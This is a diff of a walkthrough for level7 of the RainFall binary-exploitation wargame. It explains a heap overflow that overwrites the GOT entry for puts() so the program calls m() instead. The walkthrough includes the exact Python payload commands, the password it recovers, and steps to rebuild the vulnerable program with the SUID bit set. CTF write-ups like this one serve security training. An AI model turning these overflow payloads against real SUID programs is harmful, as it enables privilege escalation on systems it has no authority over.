@@ -1,10 +1,58 @@
-first parameter is address where to write:
-    here we use `puts()' got address
-second parameter is data to write:
-    we overwrite `puts()' address with address of function `m()'
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
 
-----
+# We want to overwrite function puts() GOT address to call function m() instead.
 
-level7@RainFall:/tmp$ /home/user/level7/level7 $(python -c "print('A'*20+'\x08\x04\x99\x28'[::-1])") $(python -c "print('\x08\x04\x84\xf4'[::-1])")
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1552713605
+# Function puts() GOT entry is at address 0x08049928
+# Function m() is at address 0x080484f4
+
+# We inspect with gdb that the 4 malloc(8) calls each return an address 16 bytes from each other on the heap, meaning there is 8 bytes of metadata between each 8-byte malloc block
+
+[ malloc(8)   ][ metadata(8) ][ malloc(8)   ][ metadata(8) ][ malloc(8)   ][ metadata(8) ][ malloc(8)   ][ metadata(8) ]
+
+# Before first strcpy():
+
+[ 0x1 | &a[1] ][ metadata    ][ a[1]        ][ metadata    ][ 0x2 | &b[1] ][ metadata    ][ b[1]        ][ metadata    ]
+
+# After first strcpy():
+
+                              ( 20 bytes padding                  )( payload )
+[ 0x1 | &a[1] ][ metadata    ][ a[1]        ][ metadata    ][ 0x2 | GOT_ADDR ][ metadata ][ b[1]        ][ metadata    ]
+
+# After second strcpy(), argv[2] will be copied to the GOT_ADDR instead of b[1]
+
+# Run the program
+~/level7 `python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1])"` `python -c "print('\x08\x04\x84\xf4'[::-1])"`
+
+# Now we can log in as user level8
+su level8
+# password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level8:
+
+    # Compile the program in /tmp
+    gcc source7.c -o ft_level7
+
+    # Edit suid
+    chmod u+s ft_level7
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_level7 ~
+
+# As user level7:
+
+	# Function puts() GOT entry is at address 0x0804a014
+	# Function m() is at address 0x08048514
+
+	# Run the program
+	/home/user/level8/ft_level7 `python -c "print('A' * 20 + '\x08\x04\xa0\x14'[::-1])"` `python -c "print('\x08\x04\x85\x14'[::-1])"`
+
+
+
